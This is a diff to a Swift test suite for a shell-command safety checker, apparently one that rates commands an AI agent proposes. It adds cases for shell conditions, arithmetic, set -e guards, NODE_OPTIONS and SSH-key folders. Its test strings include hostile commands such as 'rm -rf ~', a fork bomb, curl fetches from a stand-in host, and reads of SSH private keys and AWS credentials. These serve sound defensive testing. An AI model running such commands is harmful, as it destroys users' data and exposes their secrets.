@@ -418,8 +418,9 @@ private let safetyCases: [SafetyCase] = [
     // from command output / read): zsh and bash run `a[$(cmd)]` embedded in it.
     .init("(( $(curl -s http://x.example/n) ))", .blocked),
     .init("d=$(curl -s http://x.example/n); (( d ))", .blocked),
-    .init("(( $(date +%s) % 2 ))", .high),
-    // `date +%s` only prints digits, which can't name a subscript (safety-usability#3).
+    // `date +%s` only prints digits, which can't name a subscript (safety-usability#3), written
+    // straight into the arithmetic or not (safety3-usability#P4).
+    .init("(( $(date +%s) % 2 ))", .low),
     .init("x=$(date +%s); (( y = x + 1 ))", .low),
     .init("x=$(cat n.txt); (( y = x + 1 ))", .high),
     .init("read n < /tmp/n; (( n * 2 ))", .high),
@@ -609,7 +610,6 @@ private let safetyCases: [SafetyCase] = [
     .init("ls **/*.swift", .low),
     .init("wc -l **/*.swift", .low),
     .init("cat ~/Library/*/login.keychain-db", .high),
-    .init("ls ~/.ssh", .high),
     .init("cat ~/**/id_ed25519", .high),
     .init("cat ~/*/id_rsa(D)", .high),
     .init("cat ~/**/.ssh/id_rsa", .high),
@@ -622,6 +622,133 @@ private let safetyCases: [SafetyCase] = [
     .init("function b { b | b & }; b", .blocked),
     .init("echo ':(){ :|:& };:' | sh", .blocked),
     .init("echo ':(){ :|:& };:'", .low),
+
+    // `&&`, `||`, `(`, `)`, `<` and `>` inside `[[ … ]]` belong to the condition, which is one
+    // command (safety3-usability#P1); what comes after its `]]` is still checked.
+    .init("[[ $x == 1 && $y == 2 ]] && echo both", .low),
+    .init("if [[ -n \"$CI\" && \"$CI\" != false ]]; then echo ci; fi", .low),
+    .init("[[ \"$branch\" == main || \"$branch\" == master ]] && echo default", .low),
+    .init("if [[ $# -gt 0 && $1 == --help ]]; then echo usage; fi", .low),
+    .init("[[ -f Package.swift && -d Sources ]] && echo swiftpm", .low),
+    .init("[[ -n \"$a\" && -n \"$b\" ]]", .low),
+    .init("[[ ( -f a || -f b ) && ! -d c ]] && echo ok", .low),
+    .init("[[ $a > $b ]] && echo later", .low),
+    .init("[[ $x == (a|b) ]] && echo match", .low),
+    .init("while [[ $n -lt 3 && -z $done ]]; do n=$((n + 1)); done", .low),
+    .init("[[ -n x && -n y ]] && rm -rf ~", .blocked),
+    .init("[[ -n x && -n y ]]&&rm -rf ~", .blocked),
+    .init("[[ -n x ]]; rm -rf ~", .blocked),
+    .init("[[ $(rm -rf ~) == x && -n y ]]", .blocked),
+    .init("[[ -n y && -f <(rm -rf ~) ]]", .blocked),
+    .init("[[ -n y ]](rm -rf ~)", .blocked),
+    .init("[[ a == b && rm -rf ~", .blocked),
+    .init("[[ a == b || ( touch x", .high),
+    .init("x=$(cat f); [[ -n y && $x -eq 1 ]]", .high),
+    .init("x=$(cat f); [[ ( $x -gt 1 ) ]]", .high),
+
+    // `((` after `if`, `while`, `for`… is arithmetic too (safety3-usability#P2); `((cmd) )`,
+    // which doesn't close with `))`, is a subshell and its commands run.
+    .init("if (( $(wc -l < file.txt) > 100 )); then echo long; fi", .low),
+    .init("while (( $(jobs -r | wc -l) >= 4 )); do sleep 1; done", .low),
+    .init("if (( n > 5 )); then echo big; fi", .low),
+    .init("while (( i < 3 )); do i=$((i+1)); done", .low),
+    .init("for ((i=0; i<3; i++)); do echo $i; done", .low),
+    .init("if (( $(cat f) > 1 )); then echo big; fi", .high),
+    .init("x=$(cat f); while (( x > 1 )); do echo; done", .high),
+    .init("if ((rm -rf ~) ); then :; fi", .blocked),
+    .init("((rm -rf ~) )", .blocked),
+    .init("echo $((rm -rf ~) )", .blocked),
+
+    // An array of command output holds output, not quoted command text (safety3-usability#P3).
+    .init("files=($(git diff --name-only)); echo \"${#files[@]} files changed\"", .low),
+    .init("files=($(ls *.swift)); echo \"${files[0]}\"", .low),
+    .init("arr=($(git branch --format='%(refname:short)')); echo \"${arr[0]}\"", .low),
+    .init("branches=( $(git branch -r) ); echo ${#branches[@]}", .low),
+    .init("files=($(git diff --name-only)); for ((i=0; i<${#files[@]}; i++)); do echo \"${files[$i]}\"; done", .low),
+    .init("a=('$(touch y)'); (( a[0] ))", .high),
+    .init("a=($(cat f)); (( a[0] ))", .high),
+    .init("a=($(rm -rf ~))", .blocked),
+
+    // A substitution written straight into arithmetic gets the same trust as one assigned to a
+    // variable first, when it prints only numbers (safety3-usability#P4).
+    .init("[[ $(curl -s -o /dev/null -w '%{http_code}' https://example.com) -eq 200 ]] && echo up", .low),
+    .init("echo \"took $(( $(date +%s) - start ))s\"", .low),
+    .init("echo $(( $(date +%s) - 1700000000 ))", .low),
+    .init("echo $(( $(wc -l < a.txt) + $(wc -l < b.txt) ))", .low),
+    .init("age=$(( $(date +%s) - $(stat -f %m file.txt) ))", .low),
+    .init("age=$(( $(date +%s) - $(stat -f %m file.txt) )); (( age > 60 ))", .low),
+    .init("make -j$(( $(sysctl -n hw.ncpu) + 1 ))", .medium),
+    .init("jobs=$(getconf _NPROCESSORS_ONLN); (( jobs > 4 ))", .low),
+    .init("[[ $(git rev-list --count HEAD) -gt 0 ]] && echo has-commits", .low),
+    .init("(( $(git rev-list --count HEAD) > 0 )) && echo has-commits", .low),
+    .init("echo $(( $(cat f) + 1 ))", .high),
+    .init("echo $(( $(sysctl -n hw.model) ))", .high),
+    .init("echo $(( $(date +%s) + $(cat f) ))", .high),
+    .init("x=$(( $(cat f) )); echo $x", .high),
+    .init("[[ $(curl -s https://x.example/n) -eq 1 ]]", .blocked),
+
+    // More counting producers (safety3-usability#P5), and the forms that can print names.
+    .init("count=$(grep -c TODO file.swift); [[ $count -gt 0 ]] && echo found", .low),
+    .init("n=$(grep -ci -e todo file.swift); (( n ))", .low),
+    .init("lines=$(wc -l file.txt | awk '{print $1}'); (( lines > 100 )) && echo big", .low),
+    .init("lines=$(wc -l file.txt | cut -d ' ' -f1); (( lines > 100 ))", .low),
+    .init("n=$(grep -c x *.swift); (( n ))", .high),
+    .init("n=$(grep -c x a.txt b.txt); (( n ))", .high),
+    .init("n=$(grep -cH x a.txt); (( n ))", .high),
+    .init("n=$(grep -c \"$p\" a.txt); (( n ))", .high),
+    .init("export GREP_OPTIONS=-H; n=$(grep -c x a.txt); (( n ))", .high),
+    .init("n=$(wc -l * | awk '{print $1}'); (( n ))", .high),
+    .init("n=$(wc -l a.txt | awk '{print $2}'); (( n ))", .high),
+    .init("n=$(wc -l a.txt | cut -c9- | awk '{print $1}'); (( n ))", .high),
+    .init("n=$(wc -l \"$f\" | awk '{print $1}'); (( n ))", .high),
+
+    // `set -e` and `cd x || { …; exit 1; }` stop the script when the `cd` fails, so what
+    // follows runs only in the new folder (safety3-usability#P6).
+    .init("set -e\ncd ~/proj/build\nrm -rf ./*", .high),
+    .init("set -euo pipefail\ncd ~/proj/build\nrm -rf ./*", .high),
+    .init("set -o errexit\ncd ~/proj/build\nrm -rf *", .high),
+    .init("setopt err_exit; cd ~/proj/build; rm -rf *", .high),
+    .init("cd ~/proj/build || { echo 'no build dir' >&2; exit 1; }\nrm -rf ./*", .high),
+    .init("cd ~/proj/build || {\n  echo 'no build dir' >&2\n  exit 1\n}\nrm -rf ./*", .high),
+    .init("cd ~/proj/build || (echo 'no build dir'; exit 1); rm -rf *", .blocked),
+    .init("cd ~/proj/build || { false && exit 1; }; rm -rf *", .blocked),
+    .init("cd ~/proj/build || { exit 1; } & rm -rf *", .blocked),
+    .init("set -e; set +e; cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; set +o errexit; cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; unsetopt errexit; cd ~/proj/build; rm -rf *", .blocked),
+    .init("if true; then set -e; fi; cd ~/proj/build; rm -rf *", .blocked),
+    .init("true && set -e; cd ~/proj/build; rm -rf *", .blocked),
+    .init("(set -e); cd ~/proj/build; rm -rf *", .blocked),
+    .init("sh -c 'set -e'; cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -A x -e; cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; eval \"$x\"; cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; source ./env.sh; cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; cd ~/proj/build || true; rm -rf *", .blocked),
+    .init("set -e; ! cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; cd ~/proj/build | cat; rm -rf *", .blocked),
+    .init("set -e; make && cd ~/proj/build; rm -rf *", .blocked),
+    .init("set -e; cd ~/proj/build & rm -rf *", .blocked),
+    .init("set -e; cd ~/proj/*; rm -rf *", .blocked),
+    .init("set() { :; }; set -e; cd ~/proj/build; rm -rf *", .blocked),
+
+    // More ways to keep NODE_OPTIONS to flags that load no code (safety3-usability#P8).
+    .init("NODE_OPTIONS=--experimental-vm-modules npx jest", .medium),
+    .init("NODE_OPTIONS=--openssl-legacy-provider npm start", .medium),
+    .init("NODE_OPTIONS='--max_old_space_size=4096' npm run build", .medium),
+    .init("NODE_OPTIONS='--experimental_loader ./x.mjs' node a.js", .high),
+    .init("NODE_OPTIONS=--openssl-config=/tmp/x.cnf npm start", .high),
+    .init("NODE_OPTIONS=--re_quire=./x.js npm test", .high),
+
+    // Listing a key folder or asking whether a key exists reads no key (safety3-usability#P9).
+    .init("ls -la ~/.ssh", .low),
+    .init("ls ~/.ssh", .low),
+    .init("ls -la ~/.aws", .low),
+    .init("stat ~/.ssh", .low),
+    .init("test -f ~/.ssh/id_ed25519 && echo has-key", .low),
+    .init("[ -f ~/.ssh/id_ed25519 ] && echo has-key", .low),
+    .init("wc -c ~/.ssh/id_rsa", .high),
+    .init("head -1 ~/.aws/credentials", .high),
+    .init("ls ~/.ssh && cat ~/.ssh/id_rsa", .high),
 ]
 
 @Suite("CommandSafety")
@@ -682,6 +809,32 @@ struct CommandToolsSafetyTests {
         #expect(CommandSafety.assess("echo 'unterminated", cwd: nil, home: testHome).risk == .low)
     }
 
+    /// Module paths that name the project by `$PWD`, `$(pwd)` or add to the variable's old value
+    /// are like `PYTHONPATH=src` (safety3-usability#P7); anything reaching outside it isn't.
+    @Test func projectFoldersOnModulePaths() {
+        let cwd = testHome + "/proj"
+        let medium = [
+            "PYTHONPATH=$PWD python3 -m pytest", "PYTHONPATH=$(pwd) python3 -m pytest", "PYTHONPATH=\"$(pwd)/src\" python3 -m pytest",
+            "PYTHONPATH=\"$PWD/src\" python3 -m pytest", "PYTHONPATH=src:$PYTHONPATH pytest", "export PYTHONPATH=\"${PYTHONPATH}:$(pwd)\"",
+            "export PYTHONPATH=\"$(pwd)/src${PYTHONPATH:+:$PYTHONPATH}\"", "NODE_PATH=`pwd`/lib:$NODE_PATH node x.js",
+        ]
+        for c in medium {
+            let v = CommandSafety.assess(c, cwd: cwd, home: testHome)
+            #expect(v.risk == .medium && v.blocked == nil, "\(c): \(v.risk) \(v.reasons)")
+        }
+        let high = [
+            "PYTHONPATH=$(pwd)/../other python3 x.py", "PYTHONPATH=$(cd /tmp; pwd) python3 x.py", "PYTHONPATH=$HOME python3 x.py",
+            "PYTHONPATH=$OTHER:src python3 x.py", "pwd() { echo /tmp; }; PYTHONPATH=$(pwd) python3 x.py", "PYTHONPATH='$(…)' python3 x.py",
+            "PYTHONPATH=/tmp/x:$PYTHONPATH python3 x.py", "PYTHONPATH=$(pwd)\"$(pwd)\"'$(…)' python3 x.py",
+        ]
+        for c in high {
+            let v = CommandSafety.assess(c, cwd: cwd, home: testHome)
+            #expect(v.risk == .high && v.blocked == nil, "\(c): \(v.risk) \(v.reasons)")
+        }
+        // With no folder known, `$PWD` could be anywhere.
+        #expect(CommandSafety.assess("cd \"$x\" && PYTHONPATH=$PWD python3 -m pytest", cwd: cwd, home: testHome).risk == .high)
+    }
+
     /// With no workspace the agent runs from home; `cd <project> && …` there is approval-gated
     /// like anywhere else, not blocked (safety-usability#1), and `../` writes stay in home (#4).
     @Test func cdChainsFromTheDefaultFolder() {
@@ -725,7 +878,11 @@ struct AdversarialCase: Sendable, CustomTestStringConvertible {
     let command: String
     /// The verdict must be at least this (blocked counts as above high).
     let atLeast: Expect
-    init(_ name: String, _ command: String, _ atLeast: Expect) { self.name = name; self.command = command; self.atLeast = atLeast }
+    /// The longest the check may take (debug build).
+    let limit: Duration
+    init(_ name: String, _ command: String, _ atLeast: Expect, limit: Duration = .seconds(5)) {
+        self.name = name; self.command = command; self.atLeast = atLeast; self.limit = limit
+    }
     var testDescription: String { "\(name) (\(command.utf8.count) bytes)" }
 }
 
@@ -772,7 +929,29 @@ private let adversarialCases: [AdversarialCase] = [
     .init("long pipeline", Array(repeating: "cat", count: 40_000).joined(separator: " | "), .low),
     .init("embedded shell scripts", "osascript -e '" + rep("do shell script \"", 8000) + "'", .high),
     .init("glob qualifier code", "ls *(" + rep("e:", 30_000) + ")", .high),
-    .init("over the length limit", "echo " + rep("a", 70_000), .blocked),
+    // safety3-usability#P10: every `${(` or `${a[` searched to the end of the word for its close.
+    .init("unclosed flag groups", "echo " + rep("${(}", 49_990), .low, limit: .seconds(2)),
+    .init("unclosed subscripts in braces", "echo " + rep("${a[}", 39_990), .low, limit: .seconds(2)),
+    // #P11: a variable filled in thousands of times built a path of tens of megabytes.
+    .init("long value used often", "a=" + rep("x", 10_000) + "; cat " + rep("$a", 8000), .high, limit: .seconds(2)),
+    .init("long value used often, apart", "a=" + rep("x", 10_000) + "; cat " + (0..<8000).map { "$a/\($0)" }.joined(separator: " "), .high, limit: .seconds(2)),
+    .init("long value repeated", "a=" + rep("x", 10_000) + "; cat " + rep("$a ", 8000), .high, limit: .seconds(2)),
+    .init("long value repeated, deleted", "a=" + rep("x", 10_000) + "; rm -f " + rep("$a ", 8000), .high, limit: .seconds(2)),
+    .init("long folder used often", "cd /" + rep("a", 2000) + " && cat " + rep("$PWD", 4000), .high, limit: .seconds(2)),
+    .init("long value in sh -c", "a=" + rep("x", 1000) + "; sh -c \"" + rep("$a", 4000) + "\"", .high, limit: .seconds(2)),
+    .init("many variables", (0..<15_000).map { "v\($0)=x" }.joined(separator: " ") + "; cat " + rep("$v1 ", 15_000), .low, limit: .seconds(2)),
+    // #P12: one long word was turned into patterns for every brace alternative and folder.
+    .init("long word × braces", "rm -rf ~/{a,b,c,d,e,f,g,h}{a,b,c,d,e,f,g,h}/" + rep("x", 190_000), .high, limit: .seconds(2)),
+    .init("long word × braces, read", "cat ~/{a,b,c,d,e,f,g,h}{a,b,c,d,e,f,g,h}/" + rep("x", 190_000), .high, limit: .seconds(2)),
+    .init("long word × folders", "cd /tmp/{a,b,c,d,e}{f,g,h} && rm -rf {a,b,c,d,e,f,g,h}/" + rep("x", 190_000), .high, limit: .seconds(2)),
+    .init("word × folders", "cd /tmp/{a,b,c,d,e}{f,g,h} && rm -rf {a,b,c,d,e,f,g,h}/" + rep("x", 20_000), .high, limit: .seconds(2)),
+    // Conditions and arithmetic read as one command can't make the parser loop.
+    .init("long condition", "[[ " + rep("-n a && ", 20_000) + "-n b ]]", .low, limit: .seconds(2)),
+    .init("unclosed condition groups", "[[ " + rep("( ", 50_000), .high, limit: .seconds(2)),
+    .init("unclosed long condition", "[[ " + rep("-n a && ", 20_000), .high, limit: .seconds(2)),
+    .init("arithmetic that isn't", rep("((a) ", 30_000), .medium, limit: .seconds(2)),
+    .init("unclosed arithmetic", "echo " + rep("$((a) ", 30_000), .medium, limit: .seconds(2)),
+    .init("over the length limit", "echo " + rep("a", 210_000), .blocked),
 ]
 
 @Suite("CommandSafety limits")
@@ -784,7 +963,7 @@ struct CommandToolsLimitTests {
         let clock = ContinuousClock()
         var verdict = ToolVerdict(risk: .low, summary: "")
         let elapsed = clock.measure { verdict = CommandSafety.assess(c.command, cwd: nil, home: testHome) }
-        #expect(elapsed < .seconds(5), "\(c.name) took \(elapsed)")
+        #expect(elapsed < c.limit, "\(c.name) took \(elapsed)")
         switch c.atLeast {
         case .blocked: #expect(verdict.blocked != nil, "expected blocked; got \(verdict.risk) \(verdict.reasons)")
         case .high: #expect(verdict.risk == .high, "\(verdict.reasons)")
@@ -1505,6 +1684,34 @@ struct CommandToolsParserTests {
         #expect(p.list.pipelines.count == 2)
         #expect(p.list.pipelines[0].commands[0].words.map(\.text) == ["a=(x y)"])
         #expect(p.list.pipelines[1].commands[0].words.map(\.text) == ["rm", "-rf", "~"])
+        // Substitutions in an array, in `$(( ))` and in `${ }` are placeholders; quoted text stays.
+        let words = ShellParser.parse("a=($(ls) 'x$(id)') b=$(( $(date +%s) - 1 )) ${x:-$(pwd)}").list.pipelines[0].commands[0].words
+        #expect(words.map(\.text) == ["a=($(…) 'x$(id)')", "b=$(( $(…) - 1 ))", "${x:-$(…)}"])
+        #expect(words.map(\.substitutions.count) == [2, 1, 1])
+    }
+
+    /// `[[ … ]]` is one command whatever operators it holds; its `]]` ends it (safety3-usability#P1).
+    @Test func conditionsAreOneCommand() {
+        let p = ShellParser.parse("if [[ $a == 1 && ( -f b || c > d ) ]]&&echo yes; then :; fi")
+        #expect(p.list.pipelines.map { $0.commands.map { $0.words.map(\.text) } }.first
+                    == [["if", "[[", "$a", "==", "1", "&&", "(", "-f", "b", "||", "c", ">", "d", ")", "]]"]])
+        #expect(p.list.pipelines[0].connector == "&&")
+        #expect(p.list.pipelines[0].commands[0].redirects.isEmpty)
+        // Outside a condition the same characters keep their meaning.
+        #expect(ShellParser.parse("echo [[ a && b ]]").list.pipelines.count == 2)
+        #expect(ShellParser.parse("[[ a ]] > out").list.pipelines[0].commands[0].redirects.map(\.op) == [">"])
+    }
+
+    /// `((` after a keyword is arithmetic; one not closed by `))` is a subshell (safety3-usability#P2).
+    @Test func arithmeticAfterKeywords() {
+        let cond = ShellParser.parse("while (( i < 3 )); do :; done").list.pipelines[0].commands[0]
+        #expect(cond.arithmetic && cond.arithmeticText == " i < 3 " && cond.redirects.isEmpty && cond.groups.isEmpty)
+        let loop = ShellParser.parse("for ((i=0; i<3; i++)); do echo; done").list.pipelines[0].commands[0]
+        #expect(loop.arithmetic && loop.words.map(\.text) == ["for"])
+        let sub = ShellParser.parse("((rm -rf ~) )").list.pipelines[0].commands[0]
+        #expect(!sub.arithmetic && sub.groups.count == 1)
+        let dollar = ShellParser.parse("echo $((rm -rf ~) )").list.pipelines[0].commands[0].words[1]
+        #expect(dollar.text == "$(…)" && dollar.substitutions.count == 1)
     }
 
     @Test func zshProcessSubstitutionAndGlobGroups() {
@@ -1549,6 +1756,10 @@ struct CommandToolsParserTests {
     @Test func hugeBraceExpansionFailsClosed() {
         let alts = (0..<80).map { "d\($0)" }.joined(separator: ",")
         #expect(PathPattern.expandBraces("~/{\(alts)}/.ssh/id_rsa") == nil)
+        #expect(PathPattern.braceAlternatives("~/{\(alts)}/x") == .tooMany)
+        // Too long is told apart from too many, and found before anything long is built.
+        #expect(PathPattern.braceAlternatives("/{a,b}/" + String(repeating: "x", count: 100), maxLength: 150) == .tooLong)
+        #expect(PathPattern.braceAlternatives("/{a,b}/x", maxLength: 150) == .alternatives(["/a/x", "/b/x"]))
         // Reading a key through such a brace is still caught, and appending to a startup file
         // is high rather than a quiet medium.
         #expect(CommandSafety.assess("cat ~/{\(alts)}/.ssh/id_rsa", cwd: nil, home: testHome).risk == .high)
